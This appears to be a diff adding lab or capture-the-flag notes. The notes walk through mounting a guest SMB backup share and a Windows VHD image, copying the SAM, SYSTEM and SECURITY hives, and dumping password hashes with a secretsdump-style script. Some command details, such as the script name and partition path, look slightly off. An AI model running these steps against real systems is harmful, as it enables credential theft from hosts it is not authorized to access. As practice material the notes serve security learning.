@@ -1,0 +1,39 @@
+
+Installation : 
+
+1. apt-get install libguestfs-tools
+2. apt-get install cifs-utils
+
+Now create a directory : 
+
+mkdir backup_kali 
+
+NOTE : Don't go inside the backup_kali directory 
+
+Run : 
+
+mount -t cifs -o 'rw,username=guest' //<remote_ip>/<directory_guest> backup_kali 
+
+ex. mount -t cifs -o 'rw,username=guest' //10.10.10.20/Backups_remote backup_kali
+
+Now to Mount the .vhd files : 
+mkdir bastion 
+
+guestmount -a /root/backups/window........./qwwrfdad.vhd -m /dev/sdal --ro /root/bastion 
+
+
+Now after enumerating we have find the three files in  windows/system32/config/ 
+
+1. SAM 
+2. SYSTEM 
+3. SECURITY 
+
+Now use secretdump.py on these files
+
+
+Command : 
+
+secretdump.py -sam SAM -security SECURITY -system SYSTEM 
+
+
+
